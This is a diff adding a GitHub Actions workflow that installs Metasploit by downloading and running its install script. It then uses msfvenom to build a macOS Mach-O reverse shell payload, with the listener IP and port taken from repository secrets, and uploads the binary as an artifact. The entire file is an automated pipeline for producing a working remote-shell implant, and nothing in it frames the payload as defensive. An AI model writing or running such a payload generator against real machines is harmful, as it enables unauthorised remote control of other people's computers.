@@ -1,0 +1,26 @@
+name: Generate macOS Reverse Shell Payload (Secrets)
+
+on:
+  workflow_dispatch:
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Install dependencies
+        run: |
+          sudo apt-get update
+          sudo apt-get install -y curl gnupg2
+      - name: Install Metasploit
+        run: |
+          curl https://raw.githubusercontent.com/rapid7/metasploit-framework/master/msfinstall > msfinstall
+          chmod +x msfinstall
+          sudo ./msfinstall
+      - name: Generate Mach-O reverse shell (using secrets)
+        run: |
+          msfvenom -p osx/x64/shell_reverse_tcp LHOST=${{ secrets.REVSHELL_IP }} LPORT=${{ secrets.REVSHELL_PORT }} -f macho -o reverse_shell_macos
+      - name: Upload payload as artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: reverse_shell_macos
+          path: reverse_shell_macos
